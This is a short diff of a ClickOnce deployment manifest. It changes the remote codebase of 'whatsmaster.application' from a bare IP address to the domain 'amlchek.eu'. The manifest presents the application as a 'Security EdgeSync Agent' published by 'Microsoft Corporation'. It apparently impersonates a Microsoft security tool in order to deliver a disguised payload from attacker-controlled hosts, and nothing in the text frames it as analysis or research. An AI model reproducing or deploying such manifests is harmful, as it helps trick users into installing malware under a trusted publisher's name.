@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <deployment xmlns="urn:schemas-microsoft-com:clickonce:deployment" manifestVersion="1.0">
-  <deploymentProvider codebase="http://69.62.126.191/deploy/whatsmaster.application" />
+    <deploymentProvider codebase="https://amlchek.eu/deploy/whatsmaster.application" />
 
   <application identity="EdgeSync.Agent" name="Security EdgeSync Agent">
     <publisher>Microsoft Corporation</publisher>
